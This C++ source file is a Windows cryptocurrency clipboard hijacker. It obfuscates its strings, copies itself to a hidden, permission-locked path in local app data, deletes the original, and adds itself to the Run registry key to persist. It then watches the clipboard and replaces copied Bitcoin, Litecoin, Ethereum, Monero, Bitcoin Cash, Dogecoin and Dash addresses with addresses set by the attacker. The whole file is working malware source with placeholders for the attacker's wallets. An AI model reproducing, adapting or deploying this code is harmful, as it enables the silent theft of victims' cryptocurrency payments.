#include "xorstr.hpp"
#include <filesystem>
#include <optional>
#include <regex>
#include <sstream>
#include <windows.h>

using namespace std;
using namespace std::filesystem;

// Leave empty if you don't want to clip this coin
#define BTC_ADDRESS "btc"
#define LTC_ADDRESS "ltc"
#define ETH_ADDRESS "eth"
#define XMR_ADDRESS "xmr"
#define BCH_ADDRESS "bch"
#define DOGE_ADDRESS "doge"
#define DASH_ADDRESS "dash"

// Make this unique
#define MUTEX_STRING "aUkJ+dUJx"
#define FILE_NAME "clipper.exe"
#define STARTUP_NAME "clipper999"

DWORD currentClipboard = 0;
vector<pair<regex, string>> coins = {
	{regex(X("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")), X(XMR_ADDRESS)},			   // xmr
	{regex(X("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$")), X(DOGE_ADDRESS)},	   // doge
	{regex(X("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$")), X(BCH_ADDRESS)}, // bch
	{regex(X("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")), X(BTC_ADDRESS)},				   // btc
	{regex(X("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$")), X(LTC_ADDRESS)},				   // ltc
	{regex(X("^0x[a-fA-F0-9]{40}$")), X(ETH_ADDRESS)},								   // eth
	{regex(X("^X[1-9A-HJ-NP-Za-km-z]{33}$")), X(DASH_ADDRESS)}						   // dash
};

optional<string> GetClipboardText() {
	if (auto data = GetClipboardData(CF_TEXT); data) {
		std::string text((char *)data);
		return text;
	}

	return nullopt;
}

// Close clipboard and set current clipboard sequence number
void MarkClipboardRead() {
	currentClipboard = GetClipboardSequenceNumber();
	CloseClipboard();
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	// Check mutex
	if (OpenMutex(MUTEX_ALL_ACCESS, 0, X(MUTEX_STRING)))
		return 0;

	// Persistance
	{
		// Fetch %localappdata% variable
		char *_appdataBuffer = nullptr;
		size_t _appdataSize = 0;
		if (!_dupenv_s(&_appdataBuffer, &_appdataSize, "localappdata") == 0 || !_appdataBuffer)
			return 1;
		path localappdata(string(_appdataBuffer, _appdataSize - 1));
		free(_appdataBuffer);
		path desiredPath = localappdata / X(FILE_NAME);

		// Get current execution path
		char _modulePath[MAX_PATH];
		GetModuleFileName(0, _modulePath, MAX_PATH);
		path modulePath(_modulePath);

		// Check if we are running from the desired path
		if (modulePath != desiredPath) {
			stringstream command;
			command << X("start cmd /Q /C \" ping localhost -n 1 && ")										   // Wait
					<< X("copy \"") << modulePath.string() << "\" \"" << desiredPath.string() << "\" && "	   // Move file
					<< X("attrib +r +h +a \"") << desiredPath.string() << "\" && "							   // Hide
					<< X("icacls \"") << desiredPath.string() << X("\" /deny \"everyone\":(WD,AD,WEA,WA) && ") // Read Only
					<< X("del \"") << modulePath.string() << "\" && "										   // Delete Self
					<< X("cmd /C \"start \"") << desiredPath.string() << X("\" && exit\" && ")				   // Start
					<< " && exit \"";

			// Register startup
			HKEY hkey = NULL;
			RegCreateKey(HKEY_CURRENT_USER, X("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &hkey);
			RegSetValueEx(hkey, STARTUP_NAME, 0, REG_SZ, (BYTE *)desiredPath.string().c_str(),
						  (DWORD)desiredPath.string().size() + 1);

			system(command.str().c_str());
			return 0;
		}
	}

	// Create mutex
	CreateMutex(0, 0, X(MUTEX_STRING));

	while (true) {
		// Check for change, sleep to decrease CPU usage
		Sleep(20); // 20 ms

		// Check for clipboard change
		if (currentClipboard == GetClipboardSequenceNumber())
			continue;

		// Open clipboard
		if (!OpenClipboard(nullptr))
			continue;

		// Fetch clipboard
		auto clipboard = GetClipboardText();
		if (!clipboard || clipboard->empty()) {
			MarkClipboardRead();
			continue;
		}

		string newClipboard = *clipboard;
		for (auto &coin : coins) {
			// Ignore empty addresses
			if (coin.second.empty())
				continue;

			newClipboard = regex_replace(newClipboard, coin.first, coin.second);
			// Only replace one address, ensures we don't fuck up
			if (newClipboard != *clipboard) {
				// Update clipboard data
				auto glob = GlobalAlloc(GMEM_FIXED, newClipboard.length() + 1);
				if (glob) {
					memcpy(glob, newClipboard.c_str(), newClipboard.length() + 1);
					EmptyClipboard();
					SetClipboardData(CF_TEXT, glob);
				}
				break;
			}
		}

		MarkClipboardRead();
	}

	return 0;
}
